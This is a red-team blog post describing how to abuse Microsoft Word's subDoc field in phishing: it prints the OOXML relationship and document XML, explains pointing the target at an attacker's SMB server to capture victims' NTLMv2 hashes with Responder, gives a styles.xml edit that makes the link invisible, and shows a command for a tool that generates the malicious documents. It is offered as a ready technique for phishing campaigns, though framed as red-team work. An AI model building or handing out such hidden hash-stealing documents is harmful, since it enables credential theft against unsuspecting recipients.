+++
title = "Abusing the Microsoft Word feature subDoc in phishing campaigns"
description = "Discover how to exploit Microsoft Word's subDoc feature for stealthy NTLMv2 hash theft in red team operations. Learn OOXML manipulation techniques, SMB share exploitation, and automated payload generation with go-subdoc tool for advanced phishing campaigns."
date = 2022-04-19
updated = 2022-04-19 # optional
draft = false # optional

[taxonomies]
categories = ["offensive-security"]
tags = ["msoffice", "office", "word", "maldoc", "phishing", "red-team", "subdoc"]

[extra]
lang = "en"
toc = true
copy = true
featured = true
comment = false
reaction = false
math = false
mermaid = false
outdate_alert = false
outdate_alert_days = 120
+++

## Microsoft Office Exploitation

The [Microsoft Office](https://en.wikipedia.org/wiki/Microsoft_Office) suite is known to have plenty of features that can be abused by attackers, red-teamers and security researchers, these features can be abused in such a way that gives the attacker unlimited possibilities and attack vectors, attacks can go from a simple [NTLMv2](https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv2) hash steal to [Arbitrary Code Execution](https://en.wikipedia.org/wiki/Arbitrary_code_execution).

You might think that Microsoft Office is quite an uncommon way to execute malware, however it's not only used to execute malicious code. It's mainly used in red-team operations for phishing campaigns. The existence of Microsoft Office makes it for an ideal tool in phishing campaigns.

## Abusing the Microsoft Word feature: subDoc

The [subDoc](https://c-rex.net/projects/samples/ooxml/e1/Part4/OOXML_P4_DOCX_subDoc_topic_ID0EAC41.html) field is an [OOXML](http://officeopenxml.com/) (Open Office XML) field implemented in Microsoft Word known to exist ever since from Microsoft Word 2007 to the Microsoft Word 2016. Its whole purpose is to embed a "subdocument" within a master document, for example, embedding an external Word document into a "master" document.

To add the subDoc field to your Word document is as easy as editing these files in the OOXML package (zip file):

### word/\_rels/document.xml.rels

```xml
<Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" Target="external_document.docx" TargetMode="External"/>
```

### word/document.xml

```xml
<w:p>
    <w:subDoc r:id="rId5"/>
</w:p>
```

As we can see, to embed a subdocument to our master document, we need to provide the file path to the file, often when we can specify an external file path, we can access external [SMB](https://en.wikipedia.org/wiki/Server_Message_Block) shares, that is, if we can depending on how mature the environment we're working on is. So then I tried to replace the `Target` field with an [UNC](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths) path to an external SMB server. Upon opening the Word document I received a SMB request on my [Responder](https://github.com/SpiderLabs/Responder) client with the `NTLMv2 Client` (The victim's IP Address), the `NTLMv2 Username` (The victim's HOSTNAME\username) and the victim's `NTLMv2 Hash`, as shown on the screenshot below.

![responder result](https://b.catgirlsare.sexy/RGMTdAA4ZBno.png)

We managed to successfully steal the victim's NTLMv2 hash, however, there's one drawback from using this feature, which is that the hyperlink is visible on the Word page as shown in the screenshot below:

![visible hyperlink](https://b.catgirlsare.sexy/zflrFrUccHuC.png)

So then I started to mess around with the files inside the OOXML package and figured out that the `styles.xml` file contained all the styles for the Hyperlink, such as its color, font, theme, etc… as shown below:

### word/styles.xml

```xml
<w:style w:type="character" w:styleId="Hyperlink">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00400B73"/>
    <w:rPr>
      <w:color w:val="FFFFFF" w:themeColor="background1"/>
      <w:u w:val="single"/>
    </w:rPr>
</w:style>
```

By editing these fields I was able to change the Hyperlink color from the default one to white, so it would disappear on the page, and it did. Easy as that.

Now you have a completely stealthy and hidden NTLMv2 hash stealer.

## Using go-subdoc to automate the whole process

Given how manual the whole process to craft a malicious Word document with subDoc is, I decided to write a PoC tool to automate the whole process in Go, it's called go-subdoc and you can find it on its GitHub repository: https://github.com/offsec-org/go-subdoc.

To use it is pretty simple, simply download one of the releases or install it to your GOPATH and provide the input file and target domain/ip address of the Responder or SMB share, as shown on the [README](https://github.com/offsec-org/go-subdoc#usage) for example:

```bash
$ go-subdoc -input target.docx/docm -target example.com/127.0.0.1
```

It will generate a new malicious payload with the \_injected name at the end.

## Conclusion

Upon reviewing the Microsoft Word specifications, I found a field called subDoc that can be used to embed a document inside another, by providing it a file path, I managed to change that file path to an external SMB share and managed to steal the victim's NTLMv2 hash in a stealthy and hidden way.
